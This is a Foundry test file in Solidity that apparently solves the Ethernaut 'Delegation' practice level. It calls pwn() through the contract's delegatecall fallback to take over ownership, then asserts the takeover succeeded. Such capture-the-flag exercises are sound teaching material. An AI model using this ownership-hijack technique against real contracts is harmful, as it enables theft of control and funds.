// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/06_delegation.sol";

contract AttackerDelegationTest is Test {
    function testDelegation() external {
        vm.prank(address(0x1));
        Delegate delegate = new Delegate(address(0x2));

        vm.prank(address(0x2));
        Delegation delegation = new Delegation(address(delegate));


        assertFalse(delegation.owner() == address(this));
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Call failed");
        assertTrue(delegation.owner() == address(this));

    }
}
